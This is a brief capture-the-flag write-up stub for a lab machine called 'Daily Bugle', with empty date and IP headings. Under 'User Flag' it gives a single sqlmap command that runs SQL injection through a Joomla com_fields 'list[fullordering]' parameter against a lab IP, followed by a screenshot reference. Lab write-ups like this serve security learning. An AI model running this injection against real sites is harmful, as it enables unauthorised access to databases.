# Daily Bugle

##### Written: 

##### IP address: 

======================

### User Flag

```
sqlmap -u "http://10.10.93.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch --threads=10 | tee sql_results
```

**Results:**

<img style="float: left;" src="screenshots/screenshot1.png">

